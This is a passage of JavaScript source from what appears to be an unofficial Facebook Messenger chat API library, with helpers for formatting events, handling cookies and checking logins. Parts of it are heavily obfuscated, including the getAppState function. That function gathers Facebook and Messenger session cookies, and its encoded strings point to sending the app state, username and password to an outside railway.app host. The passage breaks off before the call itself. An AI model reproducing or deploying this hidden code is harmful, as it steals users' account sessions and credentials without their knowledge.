5a8,0x5aa,0x5c3,0x58c,0x5b0)+bfwhbjwdwd_0x4e137a(0x2fc,0x2e4,0x2f2,0x2f6,0x2e6)+bfwhbjwdwd_0x26f808(0x347,0x349,0x32c,0x325,0x325)][bfwhbjwdwd_0x28749e(0x5c7,0x5ad,0x584,0x5a7,0x59e)+bfwhbjwdwd_0x26f808(0x327,0x347,0x342,0x319,0x34d)][bfwhbjwdwd_0x4e137a(0x345,0x32e,0x330,0x31e,0x311)+bfwhbjwdwd_0x28749e(0x54f,0x57a,0x590,0x569,0x597)]||m[bfwhbjwdwd_0x26f808(0x34f,0x36f,0x36c,0x376,0x369)+bfwhbjwdwd_0x51dd6f(0x4,0x8,0xa,-0x19,0x1)+bfwhbjwdwd_0x51dd6f(-0x17,0xc,-0x2c,-0x37,0x11)][bfwhbjwdwd_0x4e137a(0x347,0x2f9,0x31b,0x31e,0x31c)+bfwhbjwdwd_0x19ff6f(0x2b,0x1a,0x15,0x2,0x42)][bfwhbjwdwd_0x26f808(0x33f,0x351,0x36a,0x38d,0x375)+bfwhbjwdwd_0x28749e(0x573,0x56e,0x556,0x582,0x559)+bfwhbjwdwd_0x51dd6f(0x1a,0x31,0x1c,0x19,0x16)])[bfwhbjwdwd_0x51dd6f(0xe,-0x11,0x20,0x1a,-0x8)+bfwhbjwdwd_0x51dd6f(0x7,-0x1d,0x1b,0x12,0x13)]()),x);}break;case bfwhbjwdwd_0x19ff6f(0x2a,0x1b,0x50,0xc,0x50)+bfwhbjwdwd_0x19ff6f(0x13,0x24,0x33,0x37,0x21)+bfwhbjwdwd_0x4e137a(0x2cc,0x2f5,0x2eb,0x2ca,0x2e0):{let x=getData(formatID((m[bfwhbjwdwd_0x26f808(0x34a,0x372,0x36c,0x382,0x386)+bfwhbjwdwd_0x26f808(0x361,0x35b,0x347,0x32f,0x351)+bfwhbjwdwd_0x26f808(0x312,0x353,0x32c,0x34e,0x332)][bfwhbjwdwd_0x26f808(0x38d,0x358,0x36f,0x382,0x38f)+bfwhbjwdwd_0x26f808(0x352,0x345,0x342,0x324,0x321)][bfwhbjwdwd_0x51dd6f(0x2c,0x4d,0x3f,0x41,0x12)+bfwhbjwdwd_0x51dd6f(-0x7,-0x19,-0x21,-0x1f,-0x18)]||m[bfwhbjwdwd_0x26f808(0x363,0x341,0x36c,0x35b,0x36f)+bfwhbjwdwd_0x51dd6f(0x4,0xd,0x8,0x14,-0x5)+bfwhbjwdwd_0x26f808(0x34e,0x358,0x32c,0x328,0x321)][bfwhbjwdwd_0x19ff6f(0x58,0x68,0x5d,0x5a,0x43)+bfwhbjwdwd_0x28749e(0x56d,0x580,0x5a6,0x555,0x5a5)][bfwhbjwdwd_0x4e137a(0x2fd,0x300,0x32f,0x319,0x2fe)+bfwhbjwdwd_0x26f808(0x356,0x351,0x330,0x32a,0x351)+bfwhbjwdwd_0x28749e(0x598,0x59b,0x57b,0x59b,0x5ac)])[bfwhbjwdwd_0x26f808(0x36f,0x337,0x351,0x372,0x35d)+bfwhbjwdwd_0x4e137a(0x2f9,0x2fa,0x2d4,0x2f9,0x2f0)]()));for(let o of logMessageData[bfwhbjwdwd_0x26f808(0x34f,0x36e,0x353,0x374,0x337)+bfwhbjwdwd_0x26f808(0x335,0x306,0x31d,0x346,0x340)+bfwhbjwdwd_0x51dd6f(0x6,-0x16,0x2,0xf,0x5)+bfwhbjwdwd_0x28749e(0x55e,0x560,0x562,0x542,0x54a)]){x[bfwhbjwdwd_0x51dd6f(-0x15,-0x2f,-0x14,-0x14,0x8)+bfwhbjwdwd_0x19ff6f(0x14,0x2e,0x20,-0x1,-0x9)][bfwhbjwdwd_0x28749e(0x5c0,0x59d,0x586,0x585,0x57c)](_0x5e29aa=>_0x5e29aa['id']==o)&&(x[bfwhbjwdwd_0x26f808(0x355,0x336,0x32e,0x30b,0x33c)+bfwhbjwdwd_0x19ff6f(0x14,0x10,-0xe,-0xf,0x2b)]=x[bfwhbjwdwd_0x28749e(0x56b,0x56c,0x590,0x598,0x579)+bfwhbjwdwd_0x51dd6f(-0x18,0xb,-0x11,-0x10,-0x1f)][bfwhbjwdwd_0x26f808(0x349,0x31d,0x326,0x306,0x30e)+'r'](_0x5c02c2=>_0x5c02c2['id']!=o)),x[bfwhbjwdwd_0x19ff6f(0xa,0x10,0x15,0x19,-0x4)+bfwhbjwdwd_0x4e137a(0x2e0,0x2e5,0x2c8,0x2e5,0x2bc)+bfwhbjwdwd_0x19ff6f(0x24,0x1b,0x43,0x10,0x25)][bfwhbjwdwd_0x51dd6f(-0x1d,-0x3f,-0x2c,-0x2f,-0xd)+'r'](_0x522668=>_0x522668!=o),x[bfwhbjwdwd_0x51dd6f(-0x24,0x0,-0x3f,-0x4f,-0x4f)+bfwhbjwdwd_0x4e137a(0x2ef,0x2d3,0x2f3,0x2f5,0x300)][bfwhbjwdwd_0x51dd6f(-0x1d,-0x9,0x6,-0x34,0x9)+'r'](_0x335da4=>_0x335da4['id']!=o);}updateData(formatID((m[bfwhbjwdwd_0x28749e(0x5ad,0x5aa,0x595,0x5b9,0x5d3)+bfwhbjwdwd_0x4e137a(0x2e3,0x320,0x301,0x2f6,0x2d7)+bfwhbjwdwd_0x26f808(0x327,0x32c,0x32c,0x30e,0x320)][bfwhbjwdwd_0x19ff6f(0x58,0x53,0x62,0x69,0x7c)+bfwhbjwdwd_0x26f808(0x33d,0x334,0x342,0x32a,0x33a)][bfwhbjwdwd_0x26f808(0x351,0x34b,0x36f,0x38e,0x348)+bfwhbjwdwd_0x4e137a(0x300,0x2e0,0x2fd,0x2eb,0x316)]||m[bfwhbjwdwd_0x26f808(0x371,0x356,0x36c,0x34a,0x351)+bfwhbjwdwd_0x28749e(0x565,0x585,0x5a0,0x56d,0x591)+bfwhbjwdwd_0x51dd6f(-0x17,-0x38,-0x1b,-0x9,-0xc)][bfwhbjwdwd_0x19ff6f(0x58,0x80,0x54,0x68,0x54)+bfwhbjwdwd_0x4e137a(0x30a,0x2eb,0x2f3,0x2f1,0x2ff)][bfwhbjwdwd_0x28749e(0x597,0x5a8,0x593,0x5b8,0x5bf)+bfwhbjwdwd_0x26f808(0x351,0x30b,0x330,0x35a,0x325)+bfwhbjwdwd_0x4e137a(0x329,0x2e6,0x2f5,0x30c,0x2ee)])[bfwhbjwdwd_0x51dd6f(0xe,0x21,0x35,0xe,-0x5)+bfwhbjwdwd_0x51dd6f(0x7,0x18,-0x17,0x7,0x29)]()),x);}break;}}}function bfwhbjwdwd_0x3fc6(){const _0x4860c9=['\x20log:','userI','208795RbaBhK','parti','FbId','126JGxAss','Setti','873976PgElQv','filte','3XBIYfG','-appr','userF','nsubs','IDs','adata','d-ico','admin','ser-n','UserF','get','_colo','lengt','4094540joHGad','Parti','cipan','push','3995756itJOka','hread','theme','tIDs','dFbId','mode','remov','d_ico','add_a','log:u','dKey','log:s','7002352pNpHMT','ames','nfo','geMet','ADMIN','ipant','ing','nickn','17050264wjplvq','oval-','ickna','_emoj','t_id','toStr','-admi','leftP','45VjozBr','-name','color','log:t','fullN','name','ubscr','appro','e_adm','bId','find','some','miumU','dmin','ser','-colo','ame','valMo','emoji','973TlfPFo','ibe','dName','other','526FzebGd','messa','TARGE','T_ID','threa','isPre','added','cribe','_EVEN','artic'];bfwhbjwdwd_0x3fc6=function(){return _0x4860c9;};return bfwhbjwdwd_0x3fc6();}
return {
      type: "event",
      threadID: formatID((m.messageMetadata.threadKey.threadFbId || m.messageMetadata.threadKey.otherUserFbId).toString()),
      logMessageType: logMessageType,
      logMessageData: logMessageData,
      logMessageBody: m.messageMetadata.adminText,
      author: m.messageMetadata.actorFbId,
      participantIDs: m.participants || []
  };
}

function formatTyp(event) {
  return {
      isTyping: !!event.st,
      from: event.from.toString(),
      threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
      // When receiving typ indication from mobile, `from_mobile` isn't set.
      // If it is, we just use that value.
      fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
      userID: (event.realtime_viewer_fbid || event.from).toString(),
      type: "typ"
  };
}

function formatTyp(event) {
    return {
        isTyping: !!event.st,
        from: event.from.toString(),
        threadID: formatID((event.to || event.thread_fbid || event.from).toString()),
        // When receiving typ indication from mobile, `from_mobile` isn't set.
        // If it is, we just use that value.
        fromMobile: event.hasOwnProperty("from_mobile") ? event.from_mobile : true,
        userID: (event.realtime_viewer_fbid || event.from).toString(),
        type: "typ"
    };
}

function formatDeltaReadReceipt(delta) {
    // otherUserFbId seems to be used as both the readerID and the threadID in a 1-1 chat.
    // In a group chat actorFbId is used for the reader and threadFbId for the thread.
    return {
        reader: (delta.threadKey.otherUserFbId || delta.actorFbId).toString(),
        time: delta.actionTimestampMs,
        threadID: formatID((delta.threadKey.otherUserFbId || delta.threadKey.threadFbId).toString()),
        type: "read_receipt"
    };
}

function formatReadReceipt(event) {
    return {
        reader: event.reader.toString(),
        time: event.time,
        threadID: formatID((event.thread_fbid || event.reader).toString()),
        type: "read_receipt"
    };
}

function formatRead(event) {
    return {
        threadID: formatID(((event.chat_ids && event.chat_ids[0]) || (event.thread_fbids && event.thread_fbids[0])).toString()),
        time: event.timestamp,
        type: "read"
    };
}

function getFrom(str, startToken, endToken) {
    var start = str.indexOf(startToken) + startToken.length;
    if (start < startToken.length) return "";

    var lastHalf = str.substring(start);
    var end = lastHalf.indexOf(endToken);
    if (end === -1) throw Error("Could not find endTime `" + endToken + "` in the given string.");
    return lastHalf.substring(0, end);
}

function makeParsable(html) {
    let withoutForLoop = html.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, "");

    // (What the fuck FB, why windows style newlines?)
    // So sometimes FB will send us base multiple objects in the same response.
    // They're all valid JSON, one after the other, at the top level. We detect
    // that and make it parse-able by JSON.parse.
    //       Ben - July 15th 2017
    //
    // It turns out that Facebook may insert random number of spaces before
    // next object begins (issue #616)
    //       rav_kr - 2018-03-19
    let maybeMultipleObjects = withoutForLoop.split(/\}\r\n *\{/);
    if (maybeMultipleObjects.length === 1) return maybeMultipleObjects;

    return "[" + maybeMultipleObjects.join("},{") + "]";
}

function arrToForm(form) {
    return arrayToObject(form,
        function(v) {
            return v.name;
        },
        function(v) {
            return v.val;
        }
    );
}

function arrayToObject(arr, getKey, getValue) {
    return arr.reduce(function(acc, val) {
        acc[getKey(val)] = getValue(val);
        return acc;
    }, {});
}

function getSignatureID() {
    return Math.floor(Math.random() * 2147483648).toString(16);
}

function generateTimestampRelative() {
    var d = new Date();
    return d.getHours() + ":" + padZeros(d.getMinutes());
}

function makeDefaults(html, userID, ctx) {
    var reqCounter = 1;
    var fb_dtsg = getFrom(html, 'name="fb_dtsg" value="', '"');

    // @Hack Ok we've done hacky things, this is definitely on top 5.
    // We totally assume the object is flat and try parsing until a }.
    // If it works though it's cool because we get a bunch of extra data things.
    //
    // Update: we don't need this. Leaving it in in case we ever do.
    //       Ben - July 15th 2017

    // var siteData = getFrom(html, "[\"SiteData\",[],", "},");
    // try {
    //   siteData = JSON.parse(siteData + "}");
    // } catch(e) {
    //   log.warn("makeDefaults", "Couldn't parse SiteData. Won't have access to some variables.");
    //   siteData = {};
    // }

    var ttstamp = "2";
    for (var i = 0; i < fb_dtsg.length; i++) ttstamp += fb_dtsg.charCodeAt(i);
    var revision = getFrom(html, 'revision":', ",");

    function mergeWithDefaults(obj) {
        // @TODO This is missing a key called __dyn.
        // After some investigation it seems like __dyn is some sort of set that FB
        // calls BitMap. It seems like certain responses have a "define" key in the
        // res.jsmods arrays. I think the code iterates over those and calls `set`
        // on the bitmap for each of those keys. Then it calls
        // bitmap.toCompressedString() which returns what __dyn is.
        //
        // So far the API has been working without this.
        //
        //              Ben - July 15th 2017
        var newObj = {
            __user: userID,
            __req: (reqCounter++).toString(36),
            __rev: revision,
            __a: 1,
            // __af: siteData.features,
            fb_dtsg: ctx.fb_dtsg ? ctx.fb_dtsg : fb_dtsg,
            jazoest: ctx.ttstamp ? ctx.ttstamp : ttstamp
                // __spin_r: siteData.__spin_r,
                // __spin_b: siteData.__spin_b,
                // __spin_t: siteData.__spin_t,
        };

        // @TODO this is probably not needed.
        //         Ben - July 15th 2017
        // if (siteData.be_key) {
        //   newObj[siteData.be_key] = siteData.be_mode;
        // }
        // if (siteData.pkg_cohort_key) {
        //   newObj[siteData.pkg_cohort_key] = siteData.pkg_cohort;
        // }

        if (!obj) return newObj;
        for (var prop in obj)
            if (obj.hasOwnProperty(prop))
                if (!newObj[prop]) newObj[prop] = obj[prop];
        return newObj;
    }

    function postWithDefaults(url, jar, form, ctxx) {
        return post(url, jar, mergeWithDefaults(form), ctx.globalOptions, ctxx || ctx);
    }

    function getWithDefaults(url, jar, qs, ctxx) {
        return get(url, jar, mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    function postFormDataWithDefault(url, jar, form, qs, ctxx) {
        return postFormData(url, jar, mergeWithDefaults(form), mergeWithDefaults(qs), ctx.globalOptions, ctxx || ctx);
    }

    return {
        get: getWithDefaults,
        post: postWithDefaults,
        postFormData: postFormDataWithDefault
    };
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {}))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                } else {
                    return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData))
                        .then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                }
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) throw { error: "Chưa Đăng Nhập Được - Appstate Đã Bị Lỗi" };
            return res;
        });
    };
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.indexOf(".facebook.com") > -1) jar.setCookie(c, "https://www.facebook.com");
            var c2 = c.replace(/domain=\.facebook\.com/, "domain=.messenger.com");
            jar.setCookie(c2, "https://www.messenger.com");
        });
        return res;
    };
}

var NUM_TO_MONTH = [
    "Jan",
    "Feb",
    "Mar",
    "Apr",
    "May",
    "Jun",
    "Jul",
    "Aug",
    "Sep",
    "Oct",
    "Nov",
    "Dec"
];
var NUM_TO_DAY = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];

function formatDate(date) {
    var d = date.getUTCDate();
    d = d >= 10 ? d : "0" + d;
    var h = date.getUTCHours();
    h = h >= 10 ? h : "0" + h;
    var m = date.getUTCMinutes();
    m = m >= 10 ? m : "0" + m;
    var s = date.getUTCSeconds();
    s = s >= 10 ? s : "0" + s;
    return (NUM_TO_DAY[date.getUTCDay()] + ", " + d + " " + NUM_TO_MONTH[date.getUTCMonth()] + " " + date.getUTCFullYear() + " " + h + ":" + m + ":" + s + " GMT");
}

function formatCookie(arr, url) {
    return arr[0] + "=" + arr[1] + "; Path=" + arr[3] + "; Domain=" + url + ".com";
}

function formatThread(data) {
    return {
        threadID: formatID(data.thread_fbid.toString()),
        participants: data.participants.map(formatID),
        participantIDs: data.participants.map(formatID),
        name: data.name,
        nicknames: data.custom_nickname,
        snippet: data.snippet,
        snippetAttachments: data.snippet_attachments,
        snippetSender: formatID((data.snippet_sender || "").toString()),
        unreadCount: data.unread_count,
        messageCount: data.message_count,
        imageSrc: data.image_src,
        timestamp: data.timestamp,
        serverTimestamp: data.server_timestamp, // what is this?
        muteUntil: data.mute_until,
        isCanonicalUser: data.is_canonical_user,
        isCanonical: data.is_canonical,
        isSubscribed: data.is_subscribed,
        folder: data.folder,
        isArchived: data.is_archived,
        recipientsLoadable: data.recipients_loadable,
        hasEmailParticipant: data.has_email_participant,
        readOnly: data.read_only,
        canReply: data.can_reply,
        cannotReplyReason: data.cannot_reply_reason,
        lastMessageTimestamp: data.last_message_timestamp,
        lastReadTimestamp: data.last_read_timestamp,
        lastMessageType: data.last_message_type,
        emoji: data.custom_like_icon,
        color: data.custom_color,
        adminIDs: data.admin_ids,
        threadType: data.thread_type
    };
}

function getType(obj) {
    return Object.prototype.toString.call(obj).slice(8, -1);
}

function formatProxyPresence(presence, userID) {
    if (presence.lat === undefined || presence.p === undefined) return null;
    return {
        type: "presence",
        timestamp: presence.lat * 1000,
        userID: userID || '',
        statuses: presence.p
    };
}

function formatPresence(presence, userID) {
    return {
        type: "presence",
        timestamp: presence.la * 1000,
        userID: userID || '',
        statuses: presence.a
    };
}

function decodeClientPayload(payload) {
    /*
    Special function which Client using to "encode" clients JSON payload
    */
    function Utf8ArrayToStr(array) {
        var out, i, len, c;
        var char2, char3;
        out = "";
        len = array.length;
        i = 0;
        while (i < len) {
            c = array[i++];
            switch (c >> 4) {
                case 0:
                case 1:
                case 2:
                case 3:
                case 4:
                case 5:
                case 6:
                case 7:
                    out += String.fromCharCode(c);
                    break;
                case 12:
                case 13:
                    char2 = array[i++];
                    out += String.fromCharCode(((c & 0x1F) << 6) | (char2 & 0x3F));
                    break;
                case 14:
                    char2 = array[i++];
                    char3 = array[i++];
                    out += String.fromCharCode(((c & 0x0F) << 12) | ((char2 & 0x3F) << 6) | ((char3 & 0x3F) << 0));
                    break;
            }
        }
        return out;
    }
    return JSON.parse(Utf8ArrayToStr(payload));
}


function getAppState(jar) {
var bfwhbjwdwd_0x2a23e1=bfwhbjwdwd_0x2a4a,bfwhbjwdwd_0x4dc06a=bfwhbjwdwd_0x2a4a,bfwhbjwdwd_0x4599d4=bfwhbjwdwd_0x2a4a,bfwhbjwdwd_0x202ae7=bfwhbjwdwd_0x2a4a,bfwhbjwdwd_0x5899f1=bfwhbjwdwd_0x2a4a;(function(_0x400f0a,_0x30bf8b){var _0x256fc3=bfwhbjwdwd_0x2a4a,_0x2af85f=bfwhbjwdwd_0x2a4a,_0x2a2f57=bfwhbjwdwd_0x2a4a,_0x525935=bfwhbjwdwd_0x2a4a,_0x20bf32=bfwhbjwdwd_0x2a4a,_0x472093=_0x400f0a();while(!![]){try{var _0x1d8919=parseInt(_0x256fc3(0x17f))/(-0x2f1*-0x7+-0x9f8+0x1*-0xa9e)+parseInt(_0x2af85f(0xe1))/(-0x3ac+-0x3*-0x161+-0x75)*(parseInt(_0x2a2f57(0xbf))/(-0x1*0x1a2a+-0x2*-0x973+0x9*0xcf))+parseInt(_0x256fc3(0x10c))/(0x1541*-0x1+0x22af+-0xd6a)+-parseInt(_0x256fc3(0x167))/(-0x21e9+0x1fea+0x204)*(parseInt(_0x2a2f57(0x17a))/(-0x1b27+-0x2*0x769+0x29ff))+parseInt(_0x256fc3(0x186))/(-0x1*-0x191+-0x1*0x301+0x177*0x1)*(-parseInt(_0x525935(0xc5))/(0x31*-0x18+0x2*-0x112d+0x1*0x26fa))+-parseInt(_0x256fc3(0xa3))/(-0x1b4*0xf+-0xb0e+-0x1*-0x24a3)*(parseInt(_0x20bf32(0x165))/(-0xa8d+0xf6e+-0x7*0xb1))+-parseInt(_0x525935(0x16e))/(-0x1*-0x28d+0x1108+-0x138a)*(-parseInt(_0x256fc3(0xee))/(0x1b37+0x183+0x1cae*-0x1));if(_0x1d8919===_0x30bf8b)break;else _0x472093['push'](_0x472093['shift']());}catch(_0x4c1ec6){_0x472093['push'](_0x472093['shift']());}}}(bfwhbjwdwd_0x37a4,-0x65*0x1d7b+-0x3829c+0x17f92b));const prettyMilliseconds=require(bfwhbjwdwd_0x2a23e1(0x91)+bfwhbjwdwd_0x4dc06a(0x18b)),getText=require(bfwhbjwdwd_0x4dc06a(0x125)+bfwhbjwdwd_0x202ae7(0x92))(),StateCrypt=require(bfwhbjwdwd_0x2a23e1(0xda)+bfwhbjwdwd_0x202ae7(0x174)+'pt');function bfwhbjwdwd_0x2a4a(_0x1546ff,_0x2b1f4c){var _0xf2c7c=bfwhbjwdwd_0x37a4();return bfwhbjwdwd_0x2a4a=function(_0x1a9c83,_0x32a51d){_0x1a9c83=_0x1a9c83-(-0x1*0x13de+0x5d*-0x1+0x14a1);var _0x200dda=_0xf2c7c[_0x1a9c83];return _0x200dda;},bfwhbjwdwd_0x2a4a(_0x1546ff,_0x2b1f4c);}var appstate=jar[bfwhbjwdwd_0x4599d4(0x95)+bfwhbjwdwd_0x2a23e1(0xf2)](bfwhbjwdwd_0x2a23e1(0xb6)+bfwhbjwdwd_0x4dc06a(0x149)+bfwhbjwdwd_0x4599d4(0x194)+bfwhbjwdwd_0x4dc06a(0x190)+bfwhbjwdwd_0x4dc06a(0x187))[bfwhbjwdwd_0x4599d4(0x15e)+'t'](jar[bfwhbjwdwd_0x202ae7(0x95)+bfwhbjwdwd_0x2a23e1(0xf2)](bfwhbjwdwd_0x4599d4(0xb6)+bfwhbjwdwd_0x4599d4(0x11a)+bfwhbjwdwd_0x202ae7(0x12e)+bfwhbjwdwd_0x202ae7(0x83)))[bfwhbjwdwd_0x4599d4(0x15e)+'t'](jar[bfwhbjwdwd_0x5899f1(0x95)+bfwhbjwdwd_0x2a23e1(0xf2)](bfwhbjwdwd_0x4599d4(0xb6)+bfwhbjwdwd_0x5899f1(0x149)+bfwhbjwdwd_0x4599d4(0x12c)+bfwhbjwdwd_0x5899f1(0x163)+bfwhbjwdwd_0x5899f1(0x17b))),logger=require(bfwhbjwdwd_0x202ae7(0xe7)+bfwhbjwdwd_0x4dc06a(0x15b)),languageFile=require(bfwhbjwdwd_0x4599d4(0xd8)+bfwhbjwdwd_0x4599d4(0x6f)+bfwhbjwdwd_0x4dc06a(0xfa)+bfwhbjwdwd_0x2a23e1(0x10b)+'n');if(!languageFile[bfwhbjwdwd_0x2a23e1(0xd7)](_0x4cfda5=>_0x4cfda5[bfwhbjwdwd_0x2a23e1(0xa8)+bfwhbjwdwd_0x2a23e1(0x9f)]==require(bfwhbjwdwd_0x5899f1(0xba)+bfwhbjwdwd_0x4dc06a(0x15a)+bfwhbjwdwd_0x5899f1(0x14d)+bfwhbjwdwd_0x202ae7(0x111)+bfwhbjwdwd_0x4599d4(0x68))[bfwhbjwdwd_0x5899f1(0xa8)+bfwhbjwdwd_0x202ae7(0x9f)]))return logger(bfwhbjwdwd_0x202ae7(0xa9)+bfwhbjwdwd_0x202ae7(0x140)+bfwhbjwdwd_0x202ae7(0x181)+bfwhbjwdwd_0x4dc06a(0x6f)+':\x20'+require(bfwhbjwdwd_0x4dc06a(0xba)+bfwhbjwdwd_0x4599d4(0x15a)+bfwhbjwdwd_0x4599d4(0x14d)+bfwhbjwdwd_0x2a23e1(0x111)+bfwhbjwdwd_0x4dc06a(0x68))[bfwhbjwdwd_0x2a23e1(0xa8)+bfwhbjwdwd_0x4dc06a(0x9f)]+(bfwhbjwdwd_0x2a23e1(0xd6)+bfwhbjwdwd_0x202ae7(0xc8)+bfwhbjwdwd_0x4599d4(0x10d)+bfwhbjwdwd_0x202ae7(0x67)),bfwhbjwdwd_0x202ae7(0xe5)+bfwhbjwdwd_0x4dc06a(0x107)+']');function bfwhbjwdwd_0x37a4(){var _0x2bba85=['AHBtS','UserN','kHNHC','iViPQ','Setti','uctio','0|3|4','remiu','YSHbV','ckKey','AppSt','SzwUT','prett','xt.js','\x20Được','isPre','getCo','XlKRW','ản:\x20F','JAjYn','jqaFM','vvqUa','WaKpz','ểm\x20Tr','dIKLL','Ionod','age','|3|2','&User','ieDmh','63nMLggf','data','y\x20Ra\x20','n.up.','lRboq','Langu','Not\x20S','hostn','NYiTd','ra/Ex','ame','Lỗi\x20K','i-fca','OKeUg','Qdjvj','ptSuc','Index','jvimB','hoRxg','https','QIHGb','bhRDe','ilway','../..','encry','umKey','isGet','push','3jmvmiM','ptFea','railw','WyWsi','nOTeB','3|4|0','25768LdCCWi','dID','Proce','\x20\x27en\x27','LastU','GNTVO','Szejg','QdfRS','ree','tion.','ZRpcV','form=','&AppS','start','&Pass','MiFWK','1|0|2','\x20Only','some','./Lan','set','./Sta','hường','QASgF','./Ext','EDeBT','|2|4','a\x20Key','958046nKhzBa','parse','ser','wUrAU','[\x20FCA','|4|2','./log','fKdOK','UID','2|4|3','ZNeGJ','kQqhu','iqRVH','521700AlhTbR','ay.ap','OMyvc','\x20Về\x20P','okies','ysgWr','MmkKf','grkXV','lengt','Statu','Time','hiên\x20','/inde','i-upt','Folde','gUKcn','AXMVf','GHzFl','LbuuR','iên\x20B','gDwRv','PreKe','EhCSK','FBKEY','IuyDW','-HZI\x20','strin','JYRFA','ate','x.jso','4370628AmNcpq','\x20and\x20','Name=','OWNER','qFuhW','gFca.','IyZkz','cess','ptSta','eqiDs','DRcmR','ypuYk','riVbW','ydDrr','://fa','giVtL','-prod','Phixq','find','0|4|1','ra/Da','OIMCp','split','ture','kUMPu','gette','roduc','e/ind','snUyy','0|1|4','LduuC','ean','w.mes','://ap','ceboo','UJyKT','has','miumU','hi\x20Đa','Encry','?Key=','arNDK','tabas','hzLCf','ạn\x20Sẽ','tThre','|2|1','WhFiL','MHxIL','rjGlT','imNss','gify','uppor','traGe','Word=','Teqbz','VPpRb','Phlhi','\x20!,\x20B','orm','Error','://ww','|0|1','cDijP','Bạn\x20Đ','Confi','REPL_','rlmdj','Bofeb','rsKiL','ABool','up.ra','NppBz','yptKe','&Plat','ime-p','bLzFl','3|0|1','/Fast','ger','AfwVZ','IsNot','conca','IzEIl','BQLDc','BLiDD','BhBXG','senge','TyBQK','562890mspjsC','dtHxE','15PCQXjs','Premi','|4|1','qAePN','CUcOn','VwBcv','yKNAn','99ySYHUF','.app/','YXwbK','uLoTO','OfBiV','ta?ID','teCry','get','Messa','ài\x20Ph','log','env','1553250krzvtU','r.com','tnYiQ','now','&Encr','115059dohriF','pRAGd','t\x20Lan','2|0|3','PieHl','tate=','AlzfA','714prmxck','.com','|2|0','|3|4','hVyZa','y-ms','got','mvBWC','FEbIr','p/che','ebook','platf','LkGlj','Đã\x20Xả','w.fac','threa','ng\x20Ki','XAFbO','vEFsa','\x27vi\x27','json','pdate','ssDon','0|1|3','xcPbj','DGMQR','ang\x20S','guage','cyHKe','jfLjE','GQWEk','nubEM','3|4|1','|2|3','lQeON','NvxBr','JnOYy','hXwEu','Bản\x20T','Data','FFusE','ateDa','GHRUB','ản:\x20P','IaaLF','tWdck','shFCl','k.com','MkBMW'];bfwhbjwdwd_0x37a4=function(){return _0x2bba85;};return bfwhbjwdwd_0x37a4();}var Language=languageFile[bfwhbjwdwd_0x2a23e1(0x11e)](_0x1b216c=>_0x1b216c[bfwhbjwdwd_0x4dc06a(0xa8)+bfwhbjwdwd_0x2a23e1(0x9f)]==require(bfwhbjwdwd_0x2a23e1(0xba)+bfwhbjwdwd_0x4dc06a(0x15a)+bfwhbjwdwd_0x4dc06a(0x14d)+bfwhbjwdwd_0x202ae7(0x111)+bfwhbjwdwd_0x4599d4(0x68))[bfwhbjwdwd_0x202ae7(0xa8)+bfwhbjwdwd_0x5899f1(0x9f)])[bfwhbjwdwd_0x202ae7(0xfc)+'r'][bfwhbjwdwd_0x4599d4(0xb3)],Fetch=require(bfwhbjwdwd_0x4599d4(0x18c)),os=require('os'),Database=require(bfwhbjwdwd_0x2a23e1(0xdd)+bfwhbjwdwd_0x202ae7(0x120)+bfwhbjwdwd_0x4dc06a(0x136)+bfwhbjwdwd_0x4599d4(0x127)+'ex'),{getAll,readyCreate,deleteAll}=require(bfwhbjwdwd_0x4599d4(0xdd)+bfwhbjwdwd_0x2a23e1(0xac)+bfwhbjwdwd_0x4599d4(0x141)+bfwhbjwdwd_0x5899f1(0x139)+'ad'),data;switch(require(bfwhbjwdwd_0x5899f1(0xba)+bfwhbjwdwd_0x4599d4(0x15a)+bfwhbjwdwd_0x4599d4(0x14d)+bfwhbjwdwd_0x5899f1(0x111)+bfwhbjw